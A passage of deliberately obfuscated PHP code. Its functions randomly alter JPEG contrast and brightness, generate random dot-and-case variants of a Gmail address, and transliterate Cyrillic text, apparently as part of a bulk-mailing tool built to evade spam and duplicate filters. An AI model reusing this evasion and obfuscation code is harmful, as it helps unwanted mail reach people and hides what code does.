        $sign = rand(round(0 + 0.25 + 0.25 + 0.25 + 0.25) , round(0 + 0.4 + 0.4 + 0.4 + 0.4 + 0.4));
        if ($sign == round(0 + 0.5 + 0.5))
        {
            $sign = '+';
        }
        else
        {
            $sign = '-';
        }
        $contrast = rand(round(0 + 0.25 + 0.25 + 0.25 + 0.25) , round(0 + 7.5 + 7.5));
    }
    else
    {
        $sign = '';
        $contrast = round(0);
    }
    $image_p = imagecreatetruecolor($new_width, $new_height);
    $image = imagecreatefromjpeg($file);
    imagecopyresampled($image_p, $image, round(0) , round(0) , round(0) , round(0) , $new_width, $new_height, $width, $height);
    imagefilter($image_p, IMG_FILTER_CONTRAST, $sign . $contrast);
    imagefilter($image_p, IMG_FILTER_BRIGHTNESS, $brightness);
    ob_start();
    imagejpeg($image_p, null, $quality);
    $out = ob_get_clean();
    imagedestroy($image_p);
    return $out;
}
function check_gmail($email)
{
    $email = str_replace('[', '', strtolower(trim($email)));
    $email = str_replace(']', '', $email);
    return $email;
}
function RandGmail($email)
{
    $login = explode('@', $email);
    $result = '';
    $login = strtolower(str_replace('.', '', $login[round(0) ]));
    $size = strlen($login);
    for ($c = round(0) , $max = $size;$c < $max;$c++)
    {
        $up = rand(round(0) , round(0 + 0.25 + 0.25 + 0.25 + 0.25));
        $dot = rand(round(0) , round(0 + 0.25 + 0.25 + 0.25 + 0.25));
        $symbol = $login{$c};
        if ($up == round(0 + 1))
        {
            $symbol = strtoupper($symbol);
        }
        if ($dot == round(0 + 1))
        {
            $symbol = $symbol . '.';
        }
        $result .= $symbol;
    }
    if (substr($result, -round(0 + 1)) == '.')
    {
        $result = substr($result, round(0) , -round(0 + 0.33333333333333 + 0.33333333333333 + 0.33333333333333));
    }
    return $result . '@gmail.com';
}
function rus2translit($string)
{
    $converter = array(
        'а' => 'a',
        'б' => 'b',
        'в' => 'v',
        'г' => 'g',
        'д' => 'd',
        'е' => 'e',
        'ё' => 'e',
        'ж' => 'zh',
        'з' => 'z',
        'и' => 'i',
        'й' => 'y',
        'к' => 'k',
        'л' => 'l',
        'м' => 'm',
        'н' => 'n',
        'о' => 'o',
        'п' => 'p',
        'р' => 'r',
        'с' => 's',
        'т' => 't',
        'у' => 'u',
        'ф' => 'f',
        'х' => 'h',
        'ц' => 'c',
        'ч' => 'ch',
        'ш' => 'sh',
        'щ' => 'sch',
        'ь' => '',
        'ы' => 'y',
        'ъ' => '',
        'э' => 'e',
        'ю' => 'yu',
        'я' => 'ya',
        'А' => 'A',
        'Б' => 'B',
        'В' => 'V',
        'Г' => 'G',
        'Д' => 'D',
        'Е' => 'E',
        'Ё' => 'E',
        'Ж' => 'Zh',
        'З' => 'Z',
        'И' => 'I',
        'Й' => 'Y',
        'К' => 'K',
        'Л' => 'L',
        'М' => 'M',
        'Н' => 'N',
        'О' => 'O',
        'П' => 'P',
        'Р' => 'R',
        'С' => 'S',
        'Т' => 'T',
        'У' => 'U',
        'Ф' => 'F',
        'Х' => 'H',
        'Ц' => 'C',
        'Ч' => 'Ch',
        'Ш' => 'Sh',
        'Щ' => 'Sch',
        'Ь' => '',
        'Ы' => 'Y',
        'Ъ' => '',
        'Э' => 'E',
        'Ю' => 'Yu',
        'Я' => 'Ya',
    );
    return strtr($string, $converter);
}

